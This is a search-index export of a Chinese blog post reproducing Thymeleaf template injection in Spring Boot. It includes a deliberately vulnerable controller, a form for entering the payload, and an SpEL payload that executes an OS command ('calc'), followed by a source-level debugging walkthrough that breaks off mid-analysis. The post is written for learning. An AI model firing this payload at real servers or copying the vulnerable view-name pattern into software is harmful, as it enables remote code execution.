<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Thymeleaf模板注入</title>
    <link href="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="Thymeleaf模板注入"><a href="#Thymeleaf模板注入" class="headerlink" title="Thymeleaf模板注入"></a>Thymeleaf模板注入</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>看别人的，想复现学习一下，努力混口饭吃，要学的东西太多了，一个个来吧</p><p>环境是：springboot2.3.2.RELEASE + spring-boot-starter-thymeleaf（thymeleaf的版本是3.0.11）</p><h3 id="0x01-Thymeleaf简介"><a href="#0x01-Thymeleaf简介" class="headerlink" title="0x01 Thymeleaf简介"></a>0x01 Thymeleaf简介</h3><p>Thymeleaf 是一种适用于 Web 和独立环境的现代服务器端 Java 模板引擎，能够处理 HTML、XML、JavaScript、CSS 甚至纯文本。</p><p>Thymeleaf 的主要目标是提供一种优雅且高度可维护的模板创建方式。为实现这一点，它建立在<em>自然模板</em>的概念之上，以不影响模板用作设计原型的方式将其逻辑注入模板文件。</p><h4 id="标准表达式语法"><a href="#标准表达式语法" class="headerlink" title="标准表达式语法"></a>标准表达式语法</h4><p>thymeleaf中支持多种表达式，这也是thymeleaf功能强的重要原因之一</p><ul><li><code>#&#123;...&#125;</code>    消息表达式</li><li><code>$&#123;...&#125;</code>    变量表达式（实际上是在上下文中包含的变量映射上执行的 OGNL（对象图导航语言）表达式）</li><li><code>*&#123;...&#125;</code>    选择表达式（和变量表达式类似，区别在于计算<strong>选定对象</strong>上的表达式而不是整个上下文。）</li><li><code>@&#123;...&#125;</code>    链接网址</li><li><code>~&#123;...&#125;</code>    片段表达式（表示标记片段并在模板中移动它们的简单方法）</li></ul><p>除了所有这些用于表达式处理的功能之外，Thymeleaf 还具有<strong>预处理</strong>表达式的功能。</p><h4 id="Thymeleaf的预处理"><a href="#Thymeleaf的预处理" class="headerlink" title="Thymeleaf的预处理"></a>Thymeleaf的预处理</h4><p>预处理是在正常表达式之前执行的表达式，它允许修改最终将要执行的表达式。</p><p>预处理表达式与普通表达式完全一样，但出现在双下划线符号（如<code>__$&#123;expression&#125;__</code>）的包围中。</p><p>由于是使用的springboot+thymeleaf进行的复现，所以这里使用的也就是springEL表达式</p><h3 id="0x02-漏洞成因"><a href="#0x02-漏洞成因" class="headerlink" title="0x02 漏洞成因"></a>0x02 漏洞成因</h3><p>Thymeleaf的支持表达式预处理，当进入Thymeleaf视图解析器的View中包含<code>__$&#123;expression&#125;__</code>这种形式的语句时，Thymeleaf会认为此处需要进行<strong>预处理</strong>，当在<code>expression</code>处传入恶意代码时，就可以实现攻击，但此类漏洞的利用场景较为少见（可能是我见的少😭），常见的情况例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">()</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x03-复现分析"><a href="#0x03-复现分析" class="headerlink" title="0x03 复现分析"></a>0x03 复现分析</h3><h4 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h4><p><strong>exp</strong>：<code>::__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;__</code></p><p><strong>Thymeleaf版本：3.0.11</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span><br><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.2.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mechoy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-devtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">excludes</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">exclude</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">excludes</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>测试Thymeleaf模板注入<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">th:action</span>=<span class="hljs-string">&quot;@&#123;/test&#125;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;path&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;payload&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> </span>&#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>        log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里直接从<code>org.springframework.web.servlet.DispatcherServlet</code>开始进行分析</p><p>从DispatcherServlet【前置控制器】开始，如过对SpringMVC比较熟悉可以直接F8，不熟悉的话，可以像我一样，选择性不看😅，这里有个简单的关于doDispatch的说明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    HttpServletRequest processedRequest = request;<br>    HandlerExecutionChain mappedHandler = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">boolean</span> multipartRequestParsed = <span class="hljs-keyword">false</span>;<br>    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ModelAndView mv = <span class="hljs-keyword">null</span>;<br>            Object dispatchException = <span class="hljs-keyword">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 检查是否是文件上传请求</span><br>                processedRequest = <span class="hljs-keyword">this</span>.checkMultipart(request);<br>                multipartRequestParsed = processedRequest != request;<br>                <span class="hljs-comment">// checkMultipart() 当不是文件上传的请求时，不会做任何操作</span><br>                mappedHandler = <span class="hljs-keyword">this</span>.getHandler(processedRequest);<br>                <span class="hljs-comment">// 如果没有符合该请求的适配器(mapperHandler),将会直接返回404</span><br>                <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-keyword">null</span>) &#123;<br>                    <span class="hljs-keyword">this</span>.noHandlerFound(processedRequest, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-comment">// 获取与请求相符的HandlerAdapter（适配器）</span><br>                HandlerAdapter ha = <span class="hljs-keyword">this</span>.getHandlerAdapter(mappedHandler.getHandler());<br>                String method = request.getMethod();<span class="hljs-comment">// 获取请求方法</span><br>                <span class="hljs-keyword">boolean</span> isGet = HttpMethod.GET.matches(method); <span class="hljs-comment">// 判断是否为get方法</span><br>                <span class="hljs-comment">// 检查是否是HttpMethod中存在的方法,请求方法为GET则进入</span><br>                <span class="hljs-keyword">if</span> (isGet || HttpMethod.HEAD.matches(method)) &#123;<br>                    <span class="hljs-keyword">long</span> lastModified = ha.getLastModified(request, mappedHandler.getHandler());<br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> ServletWebRequest(request, response)).checkNotModified(lastModified) &amp;&amp; isGet) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-comment">// 拦截器，执行preHandle拦截器</span><br>                <span class="hljs-keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-comment">// 执行Controller【请求处理器】中的相应方法【处理请求，做出响应】</span><br>                mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br>                <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><span class="hljs-comment">// 获取视图View</span><br>                <span class="hljs-keyword">this</span>.applyDefaultViewName(processedRequest, mv);<br>                <span class="hljs-comment">// 拦截器后置处理</span><br>                mappedHandler.applyPostHandle(processedRequest, response, mv);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var20) &#123;<br>                dispatchException = var20;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var21) &#123;<br>                dispatchException = <span class="hljs-keyword">new</span> NestedServletException(<span class="hljs-string">&quot;Handler dispatch failed&quot;</span>, var21);<br>            &#125;<br>            <span class="hljs-comment">// 利用mv进行页面渲染</span><br>            <span class="hljs-keyword">this</span>.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>            <span class="hljs-keyword">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, var22);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var23) &#123;<br>            <span class="hljs-comment">// 完成页面渲染并调用拦截器的afterCompletion()</span><br>            <span class="hljs-keyword">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, <span class="hljs-keyword">new</span> NestedServletException(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, var23));<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-comment">// 判断是否是异步请求</span><br>        <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>            <span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-keyword">null</span>) &#123;<br>                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (multipartRequestParsed) &#123;<br>            <span class="hljs-comment">// 删除上传的资源</span><br>            <span class="hljs-keyword">this</span>.cleanupMultipart(processedRequest);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A51.png"></p><p>来到第517行，进入视图渲染的地方，该方法前面只是一些参数的定义和判断</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A52.png"></p><p>直接到来第570行，跟进render()【render()方法，看名字–&gt;视图渲染】</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A53.png"></p><p>同样方法的前面不怎么需要关注，但719行可以稍微看一下【获取最优视图解析器】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> View <span class="hljs-title">resolveViewName</span><span class="hljs-params">(String viewName, <span class="hljs-meta">@Nullable</span> Map&lt;String, Object&gt; model, Locale locale, HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.viewResolvers != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// 判断当前IOC容器中是否有视图解析器</span><br>        Iterator var5 = <span class="hljs-keyword">this</span>.viewResolvers.iterator();<span class="hljs-comment">// 将所有的视图解析器放到一个迭代器里面进行循环</span><br><br>        <span class="hljs-keyword">while</span>(var5.hasNext()) &#123;<span class="hljs-comment">// 循环找出最优视图解析器</span><br>            ViewResolver viewResolver = (ViewResolver)var5.next();<br>            <span class="hljs-comment">// 根据该方法中的 getBestView() 寻找最优视图解析器</span><br>            View view = viewResolver.resolveViewName(viewName, locale);<br>            <span class="hljs-keyword">if</span> (view != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> view;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A54.png"></p><p>来到739行，调用获取到的视图解析器的render()，继续跟进</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A55.png"></p><p>此时来到<code>org.thymeleaf.spring5.view.ThymeleafView</code></p><p>ThymeleafView中的render()又去调用renderFragment()对视图进行渲染，跟进</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A56.png"></p><p><code>renderFragment()</code>前面部分同样是一些参数的定义与判断，单步来到ThymeleafView的101行，猜测此处判断视图渲染中是否存在<strong>片段表达式</strong></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A57.png"></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A58.png"></p><p>单步向下，来到Class ThymeleafView的109行，此处开始处理表达式，跟进。此处再viewTemplateName外增加了<code>~&#123;...&#125;~</code>，也就是片段表达式的样子，</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A59.png"></p><p>来到<code>org.thymeleaf.standard.expression.StandardExpressionParser</code>的第41行</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A510.png"></p><p>进行一个三步运算，预处理的值，换个思路也就是，判断一下是否存在需要执行的表达式，如果有则执行一下表达式，没有则直接返回，跟进，因为preprocess传入的值是true，所以一定是执行<code>StandardExpressionPreprocessor.preprocess(context, input)</code></p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A511.png"></p><p>来到<code>org.thymeleaf.standard.expression.StandardExpressionPreprocessor</code>第17行，先是判断一下是否存在<code>_</code>，也就是想看一下是否存在需要预处理的东西</p><p><img 